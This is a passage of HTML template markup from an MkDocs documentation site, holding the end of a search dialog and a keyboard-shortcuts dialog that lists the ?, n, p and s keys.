                <h4 class="modal-title" id="searchModalLabel">Search</h4>
                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
            </div>
            <div class="modal-body">
                <p>From here you can search these documents. Enter your search terms below.</p>
                <form>
                    <div class="form-group">
                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
                    </div>
                </form>
                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
            </div>
            <div class="modal-footer">
            </div>
        </div>
    </div>
</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
            </div>
            <div class="modal-body">
              <table class="table">
                <thead>
                  <tr>
                    <th style="width: 20%;">Keys</th>
                    <th>Action</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td class="help shortcut"><kbd>?</kbd></td>
                    <td>Open this help</td>
                  </tr>
                  <tr>
                    <td class="next shortcut"><kbd>n</kbd></td>
                    <td>Next page</td>
                  </tr>
                  <tr>
                    <td class="prev shortcut"><kbd>p</kbd></td>
                    <td>Previous page</td>
                  </tr>
                  <tr>
                    <td class="search shortcut"><kbd>s</kbd></td>
                    <td>Search</td>
                  </tr>
                </tbody>
              </table>
            </div>
            <div class="modal-footer">
            </div>
        </div>
    </div>
</div>

    </body>
</html>
